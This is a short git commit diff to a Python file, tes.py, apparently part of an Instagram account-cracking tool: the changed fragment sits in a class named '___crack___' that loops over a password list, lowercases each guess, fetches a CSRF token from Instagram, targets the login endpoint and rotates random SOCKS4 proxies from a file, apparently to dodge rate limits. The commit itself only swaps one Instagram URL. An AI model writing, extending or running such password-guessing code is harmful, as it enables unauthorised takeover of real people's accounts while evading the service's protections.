3b83ec6d83df2ce31354ad25e6f9729180b15b23
MN4WN1-777 <86679493+MN4WN1-777@users.noreply.github.com>
2022-06-16 08:02:20 -0800

    Update tes.py

--- tes.py
+++ tes.py
@@ -421,7 +421,7 @@ class ___crack___:
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://i.instagram.com/')
+                ___url = ('https://z-p42.www.instagram.com/')
                 ___login = ('https://i.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
